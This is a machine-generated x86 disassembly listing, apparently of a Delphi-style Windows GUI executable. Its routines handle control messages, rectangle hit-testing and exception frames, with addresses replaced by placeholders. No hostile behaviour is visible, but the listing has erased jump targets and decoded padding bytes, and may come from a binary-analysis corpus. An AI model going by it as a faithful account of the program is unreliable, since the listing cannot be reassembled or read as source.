mov edx edi
xor ecx ecx
mov eax ebx
call sub_4419c4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403448
sub_441b08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4413e4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_441378
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4413e4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_441ba4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4419c4
pop esi
pop ebx
retn
sub_441bc9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4419c4
pop esi
pop ebx
retn
sub_441bef
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4419c4
pop esi
pop ebx
retn
sub_441c19
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4419c4
pop esi
pop ebx
retn
sub_441c3f
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_441c74
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_441444
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4570cc
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403448
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4570cc
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403448
sub_441cec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_441d24
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4570cc
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403448
sub_441d5c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4405fc
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441d24
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406d48
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403448
sub_441dd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_441d24
pop esi
pop ebx
retn
sub_441df4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_441d24
pop esi
pop ebx
retn
sub_441e14
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4570cc
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403448
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44b55c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441e6c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4405ec
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_4405fc
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_441578
pop esi
retn
sub_441eac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4415ac
sub_441f5a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44080c
mov cl 0x1
sub_441f9c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_440564
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_440564
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_441fcc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_441ff0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406d48
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403448
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_441578
mov [ ebx + 0xc ] eax
sub_442094
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4404b8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4404b8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_442128
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403194
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43fb58
mov edx [ esp ]
mov eax esi
call sub_43fb34
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43fde0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43fe24
sub_4421ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_418ddc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43fedc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_418e2c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43fd84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442238
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_442128
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_446be4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4421ac
pop ecx
jmp r-xdata
sub_442298
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442386
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44238d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4403f4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4403c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4403c4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043a8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ff0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4402e4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_442394
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403448
sub_4423c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4423e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442400
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442420
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442440
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442460
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442480
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420028
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43fa18
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403448
sub_4424b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442554
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a8c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44cd68
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44cea0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44cc00
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44cfc0
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44255b
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_442564
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_4425a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_442564
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_442650
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033d8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_442684
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4426a4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403448
test al al
je r-xdata
mov eax edi
call sub_4426e4
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_442710
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44273c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406d48
mov eax esp
call sub_418e54
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43ff08
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403448
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403448
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43ff34
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_418e54
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_418ddc
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43fedc
sub_442864
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_4428a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f108
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4428d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4429d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43f4c4
push ebx
push sub_444368
call sub_420c68
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423578
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_423720
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403570
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45de9c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ff0
lea eax [ ebx + 0x188 ]
call sub_403f9c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429d7
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_4429d7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4429fc
push ebx
push esi
push edi
call sub_4035d8
mov ebx edx
mov edi eax
mov eax edi
call sub_41fe78
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4059cc
mov eax [ edi + 0x178 ]
call sub_40324c
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43e070
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44369c
mov eax edi
call sub_4438dc
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_40324c
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4438a0
mov esi eax
mov edx esi
mov eax edi
call sub_443708
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_4438dc
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43f59c
test bl bl
jle r-xdata
call sub_420d00
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_442acc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_442b90
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41a3d8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_446da4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a238
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41a32c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a238
test eax eax
je r-xdata
sub_442ba0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443444
xor eax eax
push ebp
push sub_442be0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442be7
